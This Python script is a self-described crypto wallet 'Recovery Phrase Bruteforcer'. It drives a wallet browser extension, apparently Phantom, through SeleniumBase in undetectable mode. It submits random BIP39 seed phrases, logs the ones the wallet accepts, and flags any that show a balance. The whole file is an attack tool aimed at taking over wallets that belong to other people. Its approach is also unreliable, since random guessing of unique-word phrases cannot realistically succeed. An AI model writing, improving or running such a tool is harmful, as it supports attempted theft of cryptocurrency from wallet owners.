import random
from mnemonic import Mnemonic
from seleniumbase import Driver
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os, json
import threading

class RecoveryPhraseGuesser:
    def __init__(self, word_list=None, phrase_length=24,is_headless=True):
        self.is_headless = is_headless
        if phrase_length not in [12, 24]:
            raise ValueError("Phrase length must be 12 or 24")
        self.mnemo = Mnemonic("english")
        self.word_list = word_list or self.mnemo.wordlist
        self.phrase_length = phrase_length
        self.used_combinations = set()  # Track used combinations
        self.recovery_phrases_path = "recovery_phrases.json"
        self.balances_path = "balances.json"
        data = []
        try:
            with open(self.recovery_phrases_path, "r") as d:
                data = json.load(d)
            data = [tuple(d["Recovery Phrase"]) for d in data]
            for d in data:
                self.used_combinations.add(d)
        except:
            pass

    def Runner(self):
        
        driver = self.get_driver()
        driver.switch_to.window(driver.window_handles[0])
        while True:
            try:
                guess = self.brute_force_guess()

                input_boxes = WebDriverWait(driver, 10).until(
                    EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input"))
                )
                if self.phrase_length == 24:
                    el = WebDriverWait(driver, 20).until(
                        EC.presence_of_element_located(
                            (
                                By.XPATH,
                                "//*[contains(text(),'I have a 24-word recovery phrase')]",
                            )
                        )
                    )
                    el.click()
                    time.sleep(0.2)
                    input_boxes = WebDriverWait(driver, 10).until(
                        EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input"))
                    )
                time.sleep(0.3)
                for count in range(self.phrase_length):
                    input_boxes[count].clear()
                    input_boxes[count].send_keys(guess[count])
                    driver.find_element(By.CSS_SELECTOR, "button").click()
                time.sleep(0.5)
                try:
                    if (
                        not "Invalid Secret Recovery Phrase"
                        in driver.find_element(
                            By.CSS_SELECTOR,
                            "[data-testid=onboarding-import-secret-recovery-phrase-error-message]",
                        ).text
                    ):
                        pass
                except Exception as e:
                    try:
                        self.write_to_file(guess, "Valid Account")
                        element = WebDriverWait(driver, 8).until(
                            EC.presence_of_all_elements_located(
                                (
                                    By.CSS_SELECTOR,
                                    "[data-testid=onboarding-form-secondary-button]",
                                )
                            )
                        )
                        element[0].click()
                        
                        time.sleep(0.5)
                        for f in WebDriverWait(driver, 14).until(
                            EC.presence_of_all_elements_located(
                                (By.CSS_SELECTOR, "[size='14']")
                            )
                        ):
                            b = f.text.split(" ")[0].strip()
                            if b != "0" and not b == "New":
                                self.writeValidFile(guess, "might have some balance....",self.balances_path)
                    except Exception as e:
                        self.writeValidFile(guess, "error while checking balance, check manually.","balances_check_error.json")
                try:
                    if self.is_headless:
                        driver.save_screenshot("updated_screenshot.png")
                except:
                    pass
            except Exception as e:
                print(e)
                pass
            driver.refresh()

    def write_to_file(self, guess, message):
        file_name = self.recovery_phrases_path
        data = {"Recovery Phrase": guess, "Message": message}

        if os.path.exists(file_name):
            # Append to existing JSON file
            with open(file_name, "r") as file:
                try:
                    existing_data = json.load(file)
                    # Ensure it's a list
                    if not isinstance(existing_data, list):
                        existing_data = []
                except json.JSONDecodeError:
                    existing_data = []
                existing_data.append(data)
                with open(file_name, "w") as file:
                    json.dump(existing_data, file)
        else:
            # Create new JSON file
            with open(file_name, "w") as file:
                json.dump([data], file)

    def writeValidFile(self, guess, message ,file_name):
        data = {"Recovery Phrase": guess, "Message": message}

        if os.path.exists(file_name):
            # Append to existing JSON file
            with open(file_name, "r") as file:
                try:
                    existing_data = json.load(file)
                    # Ensure it's a list
                    if not isinstance(existing_data, list):
                        existing_data = []
                except json.JSONDecodeError:
                    # If file is empty or corrupted, start with an empty list
                    existing_data = []

                # Append new data
                existing_data.append(data)
                with open(file_name, "w") as file:
                    json.dump(existing_data, file)
        else:
            # Create new JSON file
            with open(file_name, "w") as file:
                json.dump([data], file)

    # Generate a random target phrase with unique words (fully shuffled)
    def generate_target_phrase(self):
        # Randomly sample 12 unique words from the word list
        selected_words = random.sample(
            self.word_list, self.phrase_length
        )  # Ensure unique words
        random.shuffle(selected_words)  # Shuffle the order of words
        return selected_words

    # Check if a combination has been used
    def is_used_combination(self, combination):
        return tuple(combination) in self.used_combinations

    # Mark a combination as used
    def mark_as_used(self, combination):
        self.used_combinations.add(tuple(combination))

    # Brute-force guessing function
    def brute_force_guess(self):
        attempts = 0
        # Iterating over all possible combinations of words

        while True:
            combination = self.generate_target_phrase()
            attempts += 1
            # Skip already used combinations
            if self.is_used_combination(combination):
                continue
            self.used_combinations.add(tuple(combination))
            return combination

    def get_driver(self):
        is_headless = self.is_headless
        driver = Driver(
            extension_dir="panthom",
            uc=True,
            undetectable=True,
            headless1=is_headless,
            headless2=is_headless,
        )
        driver.get(
            "chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/onboarding.html?append=true"
        )
        driver.maximize_window()
        driver.switch_to.window(driver.window_handles[0])
        return driver


# Main execution
if __name__ == "__main__":
    print()
    print("*"*50)
    print(">> Welcome to the Recovery Phrase Bruteforcer")
    print("*"*16, "Author: Shahidxt", "*"*16)
    print("*"*50)
    print(">> Starting Bruteforce....")
    
    guesser = RecoveryPhraseGuesser(phrase_length=24,is_headless=False) # 12 or 24 phrase length can be used here and is_headless can be set to False to see the browser
    
    number_of_threads = 2
    for _ in range(number_of_threads):
        threading.Thread(target=guesser.Runner).start()
        time.sleep(20)
    print(">> Bruteforce started successfully...")
